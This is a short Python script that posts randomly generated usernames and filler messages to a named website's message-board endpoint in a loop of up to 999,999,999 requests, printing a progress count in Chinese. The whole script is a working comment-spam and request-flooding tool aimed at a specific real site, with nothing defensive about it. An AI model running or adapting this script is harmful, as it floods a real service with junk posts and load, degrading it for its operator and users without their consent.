#!/usr/bin/env python
# coding=utf-8

import urllib.parse
import urllib.request
import random
chars = 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789'
for i in range(999999999):
    u = ""
    for j in range(random.randint(6,10)):
        u+=chars[random.randint(0,len(chars)-1)]
        values = {"username":u,"word":u+"dddsada","submit":"留言"}
    date = urllib.parse.urlencode(values).encode(encoding='UTF8')
    url = "http://www.flycold.cn/message/view.php"
    request = urllib.request.Request(url,date)
    response = urllib.request.urlopen(request)
    #page = response.read().decode("utf8")
    #print(page)
    if(i%9 == 0):
        print("当前第",i)
